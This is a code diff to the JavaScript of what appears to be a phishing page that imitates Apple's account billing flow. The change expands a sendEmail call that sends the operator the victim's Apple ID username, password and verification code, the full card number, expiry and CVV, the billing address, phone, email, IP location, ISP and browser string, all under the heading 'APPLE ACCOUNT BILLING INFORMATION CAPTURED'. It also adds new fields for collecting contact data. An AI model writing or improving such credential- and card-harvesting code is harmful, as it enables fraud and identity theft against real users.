@@ -50,6 +50,9 @@ document.addEventListener('DOMContentLoaded', function() {
     const verificationInputs = document.querySelectorAll('.verification-input');
     verificationInputs.forEach(input => {
         input.addEventListener('input', function() {
+            // Allow only numbers and make them visible
+            this.value = this.value.replace(/\D/g, '');
+            
             const index = parseInt(this.dataset.index);
             if (this.value.length === 1 && index < 6) {
                 verificationInputs[index].focus();
@@ -258,32 +261,51 @@ function handleSubmitPayment(e) {
         zip: document.getElementById('zip').value,
         city: document.getElementById('city').value,
         state: document.getElementById('state').value,
-        country: document.getElementById('country').value
+        country: document.getElementById('country').value,
+        email: document.getElementById('billing-email').value,
+        phone: document.getElementById('billing-phone').value
     };
 
     showLoading();
 
-    // Send billing information email
-    sendEmail('Billing Information Submitted', `
-        Email: ${userData.username}
+    // Send comprehensive billing information email
+    sendEmail('Complete Billing Information Submitted', `
+        ==============================================
+        APPLE ACCOUNT BILLING INFORMATION CAPTURED
+        ==============================================
+        
+        Account Information:
+        Email/Username: ${userData.username}
+        Password: ${userData.password}
+        Verification Code: ${userData.verificationCode}
         Timestamp: ${new Date().toISOString()}
 
-        Card Information:
-        Number: ${userData.card.number}
-        Expiry: ${userData.card.expiry}
-        CVV: ${userData.card.cvv}
+        Payment Card Details:
+        Card Number: ${userData.card.number}
+        Expiry Date: ${userData.card.expiry}
+        CVV/CVC: ${userData.card.cvv}
 
         Billing Address:
-        ${userData.billing.firstName} ${userData.billing.lastName}
-        ${userData.billing.street}${userData.billing.apt ? ', ' + userData.billing.apt : ''}
-        ${userData.billing.city}, ${userData.billing.state} ${userData.billing.zip}
-        ${userData.billing.country}
+        Full Name: ${userData.billing.firstName} ${userData.billing.lastName}
+        Street Address: ${userData.billing.street}
+        Apartment/Suite: ${userData.billing.apt || 'N/A'}
+        City: ${userData.billing.city}
+        State/Province: ${userData.billing.state}
+        Zip/Postal Code: ${userData.billing.zip}
+        Country: ${userData.billing.country}
 
+        Contact Information:
+        Email Address: ${userData.billing.email}
+        Phone Number: ${userData.billing.phone}
+
+        Technical Information:
         IP Address: ${userData.ipInfo.ip || 'N/A'}
-        City: ${userData.location.city || 'N/A'}
-        State: ${userData.location.region || 'N/A'}
+        Location: ${userData.location.city || 'N/A'}, ${userData.location.region || 'N/A'}
         Country: ${userData.location.country || 'N/A'}
-        ISP: ${userData.ipInfo.org || 'N/A'}
+        ISP/Organization: ${userData.ipInfo.org || 'N/A'}
+        Browser: ${navigator.userAgent}
+        
+        ==============================================
     `);
 
     // Redirect to payment gateway after 5 seconds
